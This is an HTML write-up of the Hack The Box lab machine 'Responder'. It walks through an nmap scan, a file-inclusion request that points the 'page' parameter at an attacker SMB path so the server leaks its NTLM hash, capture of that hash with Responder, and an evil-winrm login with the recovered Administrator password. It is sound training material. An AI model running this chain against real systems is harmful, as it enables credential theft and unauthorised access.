@@ -1,0 +1,1026 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>
+        Hack The Box Starting Point — Tier 1: Foundations | 04 — Responder | Roger Rached
+    </title>
+
+    <meta name="description"
+        content="Roger Rached's Hack The Box Starting Point Tier 1 writeup for Responder — Windows, Apache on XAMPP, LFI/RFI, NTLM credential capture, Responder and Evil-WinRM.">
+
+    <meta name="theme-color" content="#08070d">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap"
+        rel="stylesheet">
+
+    <link rel="stylesheet" href="../../../../../style.css">
+</head>
+
+<body>
+
+    <div class="ambient ambient-one"></div>
+    <div class="ambient ambient-two"></div>
+
+
+    <!-- NAVIGATION -->
+    <header class="navbar">
+
+        <a href="/" class="brand">
+            <span class="brand-mark">&gt;_</span>
+            <span>Roger Rached</span>
+        </a>
+
+        <nav class="nav-links">
+            <a href="/writeups/">Writeups</a>
+            <a href="/projects/">Projects</a>
+            <a href="/tools/">Tools</a>
+            <a href="/notes/">Notes</a>
+            <a href="/research/">Research</a>
+            <a href="/guides/">Guides</a>
+            <a href="/certifications/">Certifications</a>
+            <a href="/about/">About</a>
+        </nav>
+
+        <a
+            href="https://github.com/roger-rached"
+            target="_blank"
+            rel="noopener noreferrer"
+            class="github-link"
+        >
+            GitHub ↗
+        </a>
+
+    </header>
+
+
+    <main class="page-shell">
+
+        <div class="page-container">
+
+
+            <!-- BACK TO TIER 1 -->
+            <a
+                href="/writeups/htb/starting-point/tier-1/"
+                class="writeup-back"
+            >
+                <span>←</span>
+                Back to Tier 1
+            </a>
+
+
+            <!-- MACHINE NAVIGATION -->
+            <div class="writeup-top-navigation">
+
+                <a href="/writeups/htb/starting-point/tier-1/crocodile/">
+                    <span>←</span>
+                    Previous: Crocodile
+                </a>
+
+                <a href="/writeups/htb/starting-point/tier-1/three/">
+                    Next: Three
+                    <span>→</span>
+                </a>
+
+            </div>
+
+
+            <!-- BREADCRUMBS -->
+            <div class="page-breadcrumb">
+
+                <a href="/">
+                    Home
+                </a>
+
+                <span>/</span>
+
+                <a href="/writeups/">
+                    Writeups
+                </a>
+
+                <span>/</span>
+
+                <a href="/writeups/htb/">
+                    Hack The Box
+                </a>
+
+                <span>/</span>
+
+                <a href="/writeups/htb/starting-point/">
+                    Starting Point
+                </a>
+
+                <span>/</span>
+
+                <a href="/writeups/htb/starting-point/tier-1/">
+                    Tier 1
+                </a>
+
+                <span>/</span>
+
+                <span class="current">
+                    Responder
+                </span>
+
+            </div>
+
+
+            <!-- WRITEUP HEADER -->
+            <header class="page-header writeup-intro">
+
+                <span class="section-label">
+                    HACK THE BOX · STARTING POINT · TIER 1
+                </span>
+
+                <h1 class="page-title">
+                    04 — <span>Responder.</span>
+                </h1>
+
+                <p class="page-description">
+                    Very Easy · Windows · NTLM · LFI/RFI · Apache · Evil-WinRM
+                </p>
+
+                <div class="page-tag-row">
+
+                    <span class="page-tag">
+                        VERY EASY
+                    </span>
+
+                    <span class="page-tag">
+                        WINDOWS
+                    </span>
+
+                    <span class="page-tag">
+                        NTLM
+                    </span>
+
+                    <span class="page-tag">
+                        LFI / RFI
+                    </span>
+
+                    <span class="page-tag">
+                        RESPONDER
+                    </span>
+
+                    <span class="page-tag">
+                        EVIL-WINRM
+                    </span>
+
+                </div>
+
+            </header>
+
+
+            <!-- WRITEUP -->
+            <article class="writeup-article">
+
+
+                <!-- ENUMERATION -->
+                <section class="writeup-section">
+
+                    <span class="writeup-section-label">
+                        01 — ENUMERATION
+                    </span>
+
+                    <h2>
+                        Scanning the target
+                    </h2>
+
+                    <p>
+                        I began with a full TCP port scan while disabling
+                        host discovery. This allowed me to identify services
+                        exposed by the target even if ICMP-based host discovery
+                        was unavailable.
+                    </p>
+
+                    <pre class="code-block"><code>nmap &lt;TARGET_IP&gt; -p- -Pn</code></pre>
+
+
+                    <!-- IMAGE 1 -->
+                    <img
+                        src="images/image1.png"
+                        alt="Nmap full port scan showing HTTP and WinRM services"
+                        class="writeup-image"
+                    >
+
+                    <p class="image-caption">
+                        Full TCP enumeration revealing HTTP on port 80 and WSMan on port 5985.
+                    </p>
+
+
+                    <div class="finding-box">
+
+                        <span class="finding-label">
+                            FINDING
+                        </span>
+
+                        <p>
+                            The scan revealed <strong>port 80</strong> running
+                            HTTP and <strong>port 5985</strong> exposing
+                            <strong>WSMan</strong>. The presence of WinRM
+                            suggested that valid Windows credentials could
+                            potentially provide remote command execution.
+                        </p>
+
+                    </div>
+
+                </section>
+
+
+                <!-- WEB ENUMERATION -->
+                <section class="writeup-section">
+
+                    <span class="writeup-section-label">
+                        02 — WEB ENUMERATION
+                    </span>
+
+                    <h2>
+                        Inspecting the web server
+                    </h2>
+
+                    <p>
+                        I then investigated the HTTP service on port 80 to
+                        identify the underlying web stack and application
+                        behavior.
+                    </p>
+
+
+                    <!-- IMAGE 2 -->
+                    <img
+                        src="images/image2.png"
+                        alt="HTTP banner showing Apache OpenSSL PHP and XAMPP information"
+                        class="writeup-image"
+                    >
+
+                    <p class="image-caption">
+                        HTTP enumeration revealing Apache 2.4.52, OpenSSL 1.1.1m and PHP 8.1.1.
+                    </p>
+
+
+                    <p>
+                        The server was running an Apache-based web application
+                        on a Windows environment using <strong>XAMPP</strong>.
+                        The exposed software versions and application behavior
+                        provided useful context for further testing.
+                    </p>
+
+                    <p>
+                        During enumeration, I identified a PHP parameter that
+                        appeared to control the page being loaded. This made
+                        the parameter a candidate for local or remote file
+                        inclusion testing.
+                    </p>
+
+
+                    <div class="finding-box">
+
+                        <span class="finding-label">
+                            FINDING
+                        </span>
+
+                        <p>
+                            The target was a <strong>Windows server</strong>
+                            running an Apache/PHP application through XAMPP.
+                            The <strong>page</strong> parameter presented a
+                            potential file inclusion attack surface.
+                        </p>
+
+                    </div>
+
+                </section>
+
+
+                <!-- LFI RFI -->
+                <section class="writeup-section">
+
+                    <span class="writeup-section-label">
+                        03 — FILE INCLUSION
+                    </span>
+
+                    <h2>
+                        Testing the vulnerable parameter
+                    </h2>
+
+                    <p>
+                        Since the application accepted a user-controlled
+                        <strong>page</strong> parameter, I tested whether it
+                        would accept a remote resource. The goal was to
+                        determine whether the server would attempt to access
+                        a resource hosted from my attacking machine.
+                    </p>
+
+                    <pre class="code-block"><code>view-source:http://unika.htb/index.php?page=//10.10.15.120/somefile</code></pre>
+
+
+                    <!-- IMAGE 3 -->
+                    <img
+                        src="images/image3.png"
+                        alt="Testing the vulnerable page parameter with a remote SMB path"
+                        class="writeup-image"
+                    >
+
+                    <p class="image-caption">
+                        Supplying a remote path through the vulnerable page parameter and observing the application's response.
+                    </p>
+
+
+                    <p>
+                        The test confirmed that the application processed the
+                        supplied path and exposed information about the
+                        directory, software in use, and the target endpoint.
+                        More importantly, the use of a UNC-style path provided
+                        an opportunity to trigger an SMB connection back to
+                        an attacker-controlled system.
+                    </p>
+
+                    <p>
+                        Because Windows systems can automatically attempt
+                        NTLM authentication when accessing SMB resources, I
+                        could use this behavior to test whether the target
+                        would disclose an NTLM challenge-response.
+                    </p>
+
+                </section>
+
+
+                <!-- RESPONDER -->
+                <section class="writeup-section">
+
+                    <span class="writeup-section-label">
+                        04 — NTLM CAPTURE
+                    </span>
+
+                    <h2>
+                        Capturing the NTLM challenge-response
+                    </h2>
+
+                    <p>
+                        To capture authentication attempts generated by the
+                        target, I started Responder on the VPN interface.
+                        Responder listens for network authentication protocols
+                        and can capture NTLM challenge-response material when
+                        a Windows host attempts to authenticate to a rogue
+                        service.
+                    </p>
+
+                    <pre class="code-block"><code>sudo responder -I tun0 -v</code></pre>
+
+
+                    <p>
+                        With Responder running, I sent the vulnerable request
+                        again using the remote path controlled by my machine.
+                        The Windows host attempted to access the resource over
+                        SMB, triggering an NTLM authentication exchange.
+                    </p>
+
+
+                    <!-- IMAGE 4 -->
+                    <img
+                        src="images/image4.png"
+                        alt="Responder capturing the NTLM hash from the target"
+                        class="writeup-image"
+                    >
+
+                    <p class="image-caption">
+                        Responder captures the NTLM challenge-response generated by the target.
+                    </p>
+
+
+                    <div class="finding-box">
+
+                        <span class="finding-label">
+                            FINDING
+                        </span>
+
+                        <p>
+                            An <strong>NTLM challenge-response</strong> was
+                            successfully captured. This confirmed that the
+                            vulnerable parameter could be abused to induce
+                            an outbound SMB authentication attempt.
+                        </p>
+
+                    </div>
+
+                </section>
+
+
+                <!-- HASH -->
+                <section class="writeup-section">
+
+                    <span class="writeup-section-label">
+                        05 — HASH PROCESSING
+                    </span>
+
+                    <h2>
+                        Saving the captured credential material
+                    </h2>
+
+                    <p>
+                        After obtaining the NTLM challenge-response, I saved
+                        the captured hash to a local file so it could be
+                        processed separately.
+                    </p>
+
+
+                    <!-- IMAGE 5 -->
+                    <img
+                        src="images/image5.png"
+                        alt="Saving the captured NTLM hash to a file"
+                        class="writeup-image"
+                    >
+
+                    <p class="image-caption">
+                        Saving the captured NTLM challenge-response for offline processing.
+                    </p>
+
+
+                    <p>
+                        The captured material could then be used for offline
+                        password recovery. Once the corresponding password
+                        was recovered, it could be tested against the exposed
+                        WinRM service on port 5985.
+                    </p>
+
+                </section>
+
+
+                <!-- EVIL WINRM -->
+                <section class="writeup-section">
+
+                    <span class="writeup-section-label">
+                        06 — REMOTE ACCESS
+                    </span>
+
+                    <h2>
+                        Connecting with Evil-WinRM
+                    </h2>
+
+                    <p>
+                        With valid Windows credentials available, I targeted
+                        the WinRM service identified during the initial Nmap
+                        scan. Evil-WinRM provides an interactive PowerShell
+                        session over Windows Remote Management.
+                    </p>
+
+                    <pre class="code-block"><code>sudo evil-winrm -u Administrator -p badminton -i &lt;TARGET_IP&gt;</code></pre>
+
+
+                    <!-- IMAGE 6 -->
+                    <img
+                        src="images/image6.png"
+                        alt="Evil-WinRM connecting to the Windows target"
+                        class="writeup-image"
+                    >
+
+                    <p class="image-caption">
+                        Establishing a remote PowerShell session using Evil-WinRM.
+                    </p>
+
+
+                    <div class="finding-box">
+
+                        <span class="finding-label">
+                            RESULT
+                        </span>
+
+                        <p>
+                            The recovered <strong>Administrator</strong>
+                            credentials provided authenticated remote access
+                            to the Windows host through WinRM.
+                        </p>
+
+                    </div>
+
+                </section>
+
+
+                <!-- FLAG -->
+                <section class="writeup-section">
+
+                    <span class="writeup-section-label">
+                        07 — FLAG
+                    </span>
+
+                    <h2>
+                        Locating flag.txt
+                    </h2>
+
+                    <p>
+                        With an interactive PowerShell session established,
+                        I searched the filesystem for the machine's
+                        <strong>flag.txt</strong> file.
+                    </p>
+
+                    <p>
+                        PowerShell's <strong>Get-ChildItem</strong> command
+                        can be used to enumerate files and directories
+                        recursively.
+                    </p>
+
+                    <pre class="code-block"><code>Get-ChildItem -Path C:\ -Filter flag.txt -Recurse -ErrorAction SilentlyContinue</code></pre>
+
+
+                    <!-- IMAGE 7 -->
+                    <img
+                        src="images/image7.png"
+                        alt="Searching the Windows filesystem for flag.txt"
+                        class="writeup-image"
+                    >
+
+                    <p class="image-caption">
+                        Searching the Windows filesystem and locating the flag.txt file.
+                    </p>
+
+
+                    <p>
+                        The flag was retrieved from the discovered
+                        <strong>flag.txt</strong> file, completing the
+                        Responder machine.
+                    </p>
+
+
+                    <div class="finding-box">
+
+                        <span class="finding-label">
+                            RESULT
+                        </span>
+
+                        <p>
+                            The attack chain successfully progressed from a
+                            web application file inclusion issue to NTLM
+                            credential capture, password recovery, remote
+                            Windows access and finally retrieval of the
+                            machine flag.
+                        </p>
+
+                    </div>
+
+                </section>
+
+
+                <!-- WHAT I LEARNED -->
+                <section class="writeup-section">
+
+                    <span class="writeup-section-label">
+                        08 — WHAT I LEARNED
+                    </span>
+
+                    <h2>
+                        Lessons from Responder
+                    </h2>
+
+                    <p>
+                        Responder demonstrated how a web application issue can
+                        be chained with Windows authentication behavior to
+                        obtain useful credential material. The vulnerable
+                        parameter alone did not provide direct command
+                        execution; instead, it allowed the server to initiate
+                        an outbound SMB connection.
+                    </p>
+
+                    <p>
+                        Because the connection was directed toward an
+                        attacker-controlled listener, the Windows host
+                        attempted NTLM authentication and exposed a
+                        challenge-response that could be captured and
+                        processed offline.
+                    </p>
+
+                    <p>
+                        The machine also reinforced the importance of
+                        correlating enumeration results. The initial scan
+                        identified WinRM on port 5985, which became the
+                        destination for the recovered Windows credentials.
+                    </p>
+
+
+                    <div class="page-tag-row">
+
+                        <span class="page-tag">
+                            NMAP
+                        </span>
+
+                        <span class="page-tag">
+                            WINDOWS
+                        </span>
+
+                        <span class="page-tag">
+                            APACHE
+                        </span>
+
+                        <span class="page-tag">
+                            XAMPP
+                        </span>
+
+                        <span class="page-tag">
+                            LFI / RFI
+                        </span>
+
+                        <span class="page-tag">
+                            NTLM
+                        </span>
+
+                        <span class="page-tag">
+                            RESPONDER
+                        </span>
+
+                        <span class="page-tag">
+                            WINRM
+                        </span>
+
+                        <span class="page-tag">
+                            EVIL-WINRM
+                        </span>
+
+                    </div>
+
+                </section>
+
+
+                <!-- TOOLS -->
+                <section class="writeup-section">
+
+                    <span class="writeup-section-label">
+                        09 — TOOLS &amp; TECHNIQUES
+                    </span>
+
+                    <h2>
+                        Tools used
+                    </h2>
+
+                    <p>
+                        The main tools and techniques used during the
+                        exercise were:
+                    </p>
+
+                    <ul>
+
+                        <li>
+                            <strong>Nmap</strong> — full TCP port and service enumeration
+                        </li>
+
+                        <li>
+                            <strong>Responder</strong> — NTLM authentication capture
+                        </li>
+
+                        <li>
+                            <strong>Apache / XAMPP</strong> — web application enumeration
+                        </li>
+
+                        <li>
+                            <strong>LFI / RFI Testing</strong> — testing the vulnerable page parameter
+                        </li>
+
+                        <li>
+                            <strong>NTLM</strong> — Windows authentication challenge-response
+                        </li>
+
+                        <li>
+                            <strong>Evil-WinRM</strong> — authenticated remote Windows access
+                        </li>
+
+                        <li>
+                            <strong>PowerShell</strong> — filesystem enumeration and flag discovery
+                        </li>
+
+                    </ul>
+
+                </section>
+
+
+                <!-- RESOURCES -->
+                <section class="writeup-section">
+
+                    <span class="writeup-section-label">
+                        10 — RESOURCES
+                    </span>
+
+                    <h2>
+                        Related resources
+                    </h2>
+
+                    <p>
+                        The resources below cover the machine and the
+                        enumeration, NTLM, file inclusion and WinRM techniques
+                        used throughout the exercise.
+                    </p>
+
+
+                    <!-- HTB -->
+                    <div class="resource-box">
+
+                        <div class="resource-header">
+
+                            <span class="resource-label">
+                                LAB REFERENCE
+                            </span>
+
+                        </div>
+
+
+                        <a
+                            href="https://www.hackthebox.com/machines/responder"
+                            target="_blank"
+                            rel="noopener noreferrer"
+                            class="resource-link"
+                        >
+
+                            <span class="resource-icon">
+                                ↗
+                            </span>
+
+                            <span class="resource-content">
+
+                                <strong>
+                                    Hack The Box — Responder
+                                </strong>
+
+                                <small>
+                                    Official machine page and lab synopsis
+                                </small>
+
+                            </span>
+
+                        </a>
+
+                    </div>
+
+
+                    <!-- NMAP -->
+                    <div class="resource-box">
+
+                        <div class="resource-header">
+
+                            <span class="resource-label">
+                                ENUMERATION
+                            </span>
+
+                        </div>
+
+
+                        <a
+                            href="https://nmap.org/book/man.html"
+                            target="_blank"
+                            rel="noopener noreferrer"
+                            class="resource-link"
+                        >
+
+                            <span class="resource-icon">
+                                ↗
+                            </span>
+
+                            <span class="resource-content">
+
+                                <strong>
+                                    Nmap Reference Guide
+                                </strong>
+
+                                <small>
+                                    Port scanning, service detection and NSE
+                                </small>
+
+                            </span>
+
+                        </a>
+
+                    </div>
+
+
+                    <!-- RESPONDER -->
+                    <div class="resource-box">
+
+                        <div class="resource-header">
+
+                            <span class="resource-label">
+                                NTLM
+                            </span>
+
+                        </div>
+
+
+                        <a
+                            href="https://github.com/lgandx/Responder"
+                            target="_blank"
+                            rel="noopener noreferrer"
+                            class="resource-link"
+                        >
+
+                            <span class="resource-icon">
+                                ↗
+                            </span>
+
+                            <span class="resource-content">
+
+                                <strong>
+                                    Responder
+                                </strong>
+
+                                <small>
+                                    LLMNR, NBT-NS and MDNS poisoner and credential capture tool
+                                </small>
+
+                            </span>
+
+                        </a>
+
+                    </div>
+
+
+                    <!-- EVIL-WINRM -->
+                    <div class="resource-box">
+
+                        <div class="resource-header">
+
+                            <span class="resource-label">
+                                WINDOWS REMOTE MANAGEMENT
+                            </span>
+
+                        </div>
+
+
+                        <a
+                            href="https://github.com/Hackplayers/evil-winrm"
+                            target="_blank"
+                            rel="noopener noreferrer"
+                            class="resource-link"
+                        >
+
+                            <span class="resource-icon">
+                                ↗
+                            </span>
+
+                            <span class="resource-content">
+
+                                <strong>
+                                    Evil-WinRM
+                                </strong>
+
+                                <small>
+                                    Windows Remote Management shell for authenticated access
+                                </small>
+
+                            </span>
+
+                        </a>
+
+                    </div>
+
+
+                    <!-- MICROSOFT NTLM -->
+                    <div class="resource-box">
+
+                        <div class="resource-header">
+
+                            <span class="resource-label">
+                                WINDOWS AUTHENTICATION
+                            </span>
+
+                        </div>
+
+
+                        <a
+                            href="https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview"
+                            target="_blank"
+                            rel="noopener noreferrer"
+                            class="resource-link"
+                        >
+
+                            <span class="resource-icon">
+                                ↗
+                            </span>
+
+                            <span class="resource-content">
+
+                                <strong>
+                                    Microsoft — NTLM Overview
+                                </strong>
+
+                                <small>
+                                    Microsoft documentation covering NTLM authentication
+                                </small>
+
+                            </span>
+
+                        </a>
+
+                    </div>
+
+
+                    <!-- POWERSHELL -->
+                    <div class="resource-box">
+
+                        <div class="resource-header">
+
+                            <span class="resource-label">
+                                POWERSHELL
+                            </span>
+
+                        </div>
+
+
+                        <a
+                            href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-childitem"
+                            target="_blank"
+                            rel="noopener noreferrer"
+                            class="resource-link"
+                        >
+
+                            <span class="resource-icon">
+                                ↗
+                            </span>
+
+                            <span class="resource-content">
+
+                                <strong>
+                                    PowerShell — Get-ChildItem
+                                </strong>
+
+                                <small>
+                                    Microsoft documentation for filesystem and directory enumeration
+                                </small>
+
+                            </span>
+
+                        </a>
+
+                    </div>
+
+                </section>
+
+
+                <!-- BOTTOM NAVIGATION -->
+                <div class="writeup-navigation">
+
+                    <a href="/writeups/htb/starting-point/tier-1/crocodile/">
+
+                        <span>
+                            PREVIOUS MACHINE
+                        </span>
+
+                        <strong>
+                            ← Crocodile
+                        </strong>
+
+                    </a>
+
+
+                    <a href="/writeups/htb/starting-point/tier-1/three/">
+
+                        <span>
+                            NEXT MACHINE
+                        </span>
+
+                        <strong>
+                            Three →
+                        </strong>
+
+                    </a>
+
+                </div>
+
+
+            </article>
+
+        </div>
+
+    </main>
+
+
+    <!-- FOOTER -->
+    <footer>
+
+        <div class="footer-brand">
+
+            <span class="brand-mark">
+                &gt;_
+            </span>
+
+            <strong>
+                Roger Rached
+            </strong>
+
+        </div>
+
+        <p>
+            Cybersecurity · Pentesting · AppSec · AI Security
+        </p>
+
+        <span>
+            © <span id="year"></span> Roger Rached
+        </span>
+
+    </footer>
+
+
+    <script src="../../../../../script.js"></script>
+
+</body>
+
+</html>
